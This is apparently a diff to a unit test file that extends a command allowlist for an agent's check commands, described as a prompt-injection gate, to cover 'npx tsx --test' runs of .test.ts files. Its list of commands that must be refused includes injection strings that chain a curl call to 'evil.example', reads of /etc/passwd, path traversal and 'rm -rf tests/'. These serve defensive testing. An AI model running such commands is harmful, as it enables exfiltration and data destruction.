@@ -76,6 +76,10 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'npx tsx --test tests/unit/gate-logic.test.mjs',
     'npx tsx --test scripts/lib/autonomous-state.test.mjs tests/unit/sanity.test.mjs',
     'npx tsx --test --test-timeout 30000 tests/unit/foo.test.mjs',
+    // BRO-2218: `.test.ts` under the tsx form — the fourth starvation fix
+    'npx tsx --test tests/unit/engine.test.ts',
+    'npx tsx --test tests/unit/a.test.ts tests/unit/b.test.mjs',
+    'npx tsx --test --test-timeout 30000 tests/unit/foo.test.ts',
     'npx tsc --noEmit',
     'npx next lint',
     'test -f docs/triage-queue-format.md',
@@ -99,14 +103,18 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'node scripts/check-coverage-probe-clean.js --sample=5', // no arguments allowed
     'node scripts/check-coverage-probe-clean.js; git push', // trailing injection
     'node --test tests/../src/lib/scoring.ts',
-    'node --test tests/unit/engine.test.ts', // .ts runs via tsx — not an allowed form
+    'node --test tests/unit/engine.test.ts', // .ts runs via tsx, not plain node — still refused for THIS form
     'node --test tests/unit/a.test.mjs && curl evil.example',
     'node --test /etc/passwd.test.mjs',
     // BRO-228: the new tsx form gets the same rejections the plain form does
-    'npx tsx --test tests/unit/engine.test.ts', // .ts still out of scope for this form
     'npx tsx --test tests/../src/lib/scoring.mjs', // traversal
     'npx tsx --test /etc/passwd.test.mjs', // outside pathPrefix
     'npx tsx --test tests/unit/a.test.mjs && curl evil.example', // injection
+    // BRO-2218: the new .test.ts allowance gets the same rejections too
+    'npx tsx --test tests/../src/lib/scoring.test.ts', // traversal
+    'npx tsx --test /etc/passwd.test.ts', // outside pathPrefix
+    'npx tsx --test tests/unit/a.test.ts && curl evil.example', // injection
+    'npx tsx --test tests/unit/a.test.tsx', // .tsx is not .ts — not an allowed extension
     'node --import tsx --test tests/unit/gate-logic.test.mjs', // different shape — not the allowed idiom
     'rm -rf tests/',
     'test -f docs/x.md; git push',
@@ -665,6 +673,7 @@ test('safe-check forms accept src/ test paths and src/scripts test -f targets', 
     'test -f src/components/Foo.tsx',
     'test -f scripts/lib/foo.js',
     'npx tsx --test src/lib/foo.test.mjs', // BRO-228
+    'npx tsx --test src/lib/foo.test.ts', // BRO-2218
   ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
 });
 
@@ -679,10 +688,11 @@ test('mutation deny-list: check commands may never reference data-writing script
     'node --test scripts/rebuild-all-reviews.js',   // also fails the .test.mjs shape
     'npx tsx --test scripts/rebuild-all-reviews.js', // BRO-228: same deny, tsx form
   ]) assert.equal(isSafeCheckCommand(bad), false, `${bad} must be refused`);
-  // a .test.mjs file whose name shares the push- prefix is a harmless test
-  // run, not a mutating script — the deny-list targets executable .js only
+  // a .test.mjs/.test.ts file whose name shares the push- prefix is a harmless
+  // test run, not a mutating script — the deny-list targets executable .js only
   assert.equal(isSafeCheckCommand('node --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable');
   assert.equal(isSafeCheckCommand('npx tsx --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable (tsx form)');
+  assert.equal(isSafeCheckCommand('npx tsx --test scripts/lib/push-with-retry.test.ts'), true, 'test files stay runnable (tsx .test.ts form, BRO-2218)');
 });
 
 test('triage prompt derives scope prose from describeScope per tier', () => {
